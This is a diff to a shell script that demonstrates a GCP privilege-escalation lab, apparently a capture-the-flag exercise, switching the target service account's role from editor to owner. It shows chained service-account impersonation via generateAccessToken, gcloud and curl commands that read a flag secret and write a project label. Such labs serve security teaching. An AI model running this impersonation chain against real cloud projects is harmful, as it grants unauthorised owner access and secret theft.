@@ -4,13 +4,13 @@
 #
 # Attack: starting_sa holds iam.serviceAccounts.getAccessToken on target_sa
 # (via a minimal custom role). It calls generateAccessToken to mint a
-# short-lived OAuth token for target_sa and inherit its roles/editor project
+# short-lived OAuth token for target_sa and inherit its roles/owner project
 # permissions.
 #
 # Credential model (no static SA keys):
 #   Terraform granted YOUR ADC identity serviceAccountTokenCreator on starting_sa.
 #   Demo commands pass --impersonate-service-account=starting_sa to run as it.
-#   The exploit then chains impersonation to target_sa, which holds roles/editor.
+#   The exploit then chains impersonation to target_sa, which holds roles/owner.
 #
 # Modes:
 #   Default (gcloud): uses gcloud's --impersonate-service-account delegation
@@ -99,7 +99,7 @@ for var_name in STARTING_SA_EMAIL TARGET_SA_EMAIL FLAG_SECRET_ID PROJECT_ID; do
 done
 
 echo "Starting SA (no project role): $STARTING_SA_EMAIL"
-echo "Target SA   (roles/editor):    $TARGET_SA_EMAIL"
+echo "Target SA   (roles/owner):    $TARGET_SA_EMAIL"
 echo "Deployer    (your ADC):        $DEPLOYER_EMAIL"
 echo "Project:                       $PROJECT_ID"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
@@ -278,11 +278,11 @@ else
     echo -e "${GREEN}✓ Read Secret Manager secret as $TARGET_SA_EMAIL via raw generateAccessToken chain${NC}\n"
 fi
 
-# Step 4: [THE ATTACK] Confirm editor-level write access (beyond just reading a secret).
-echo -e "${YELLOW}Step 4: [EXPLOIT] Verifying full roles/editor access via target SA (write proof)${NC}"
+# Step 4: [THE ATTACK] Confirm owner-level write access (beyond just reading a secret).
+echo -e "${YELLOW}Step 4: [EXPLOIT] Verifying full roles/owner access via target SA (write proof)${NC}"
 
 if $USE_GCLOUD; then
-    # Same full delegation chain — target_sa holds roles/editor on the project.
+    # Same full delegation chain — target_sa holds roles/owner on the project.
     show_attack_cmd "$TARGET_SA_EMAIL" \
         "gcloud projects update $PROJECT_ID --update-labels=pl-privesc-verified=true --impersonate-service-account=$STARTING_SA_EMAIL,$TARGET_SA_EMAIL"
 
@@ -291,7 +291,7 @@ if $USE_GCLOUD; then
             --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" \
             --quiet 2>/dev/null; then
         echo -e "${GREEN}✓ Successfully wrote a project label as $TARGET_SA_EMAIL!${NC}"
-        echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
+        echo -e "${GREEN}✓ PROJECT OWNER ACCESS CONFIRMED (roles/owner)${NC}"
         gcloud projects update "$PROJECT_ID" \
             --remove-labels=pl-privesc-verified \
             --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" \
@@ -318,7 +318,7 @@ else
 
     if echo "$PATCH_RESPONSE" | jq -e '.name' >/dev/null 2>&1; then
         echo -e "${GREEN}✓ Successfully wrote a project label using the generateAccessToken-derived token!${NC}"
-        echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
+        echo -e "${GREEN}✓ PROJECT OWNER ACCESS CONFIRMED (roles/owner)${NC}"
         curl -s -X PATCH \
             -H "Authorization: Bearer $TARGET_SA_TOKEN" \
             -H "Content-Type: application/json" \
@@ -337,13 +337,13 @@ echo -e "\n${YELLOW}Flag:${NC} $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. ADC identity ($DEPLOYER_EMAIL) acted as $STARTING_SA_EMAIL, which acted as"
-echo "   $TARGET_SA_EMAIL (roles/editor + secretAccessor) to read the CTF flag"
+echo "   $TARGET_SA_EMAIL (roles/owner) to read the CTF flag"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_SA_EMAIL"
 echo "    -> (iam.serviceAccounts.getAccessToken on target_sa, via minimal custom role — THE VULNERABILITY)"
 echo "    -> $TARGET_SA_EMAIL"
-echo "    -> (roles/editor on project $PROJECT_ID)"
+echo "    -> (roles/owner on project $PROJECT_ID)"
 echo "    -> CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
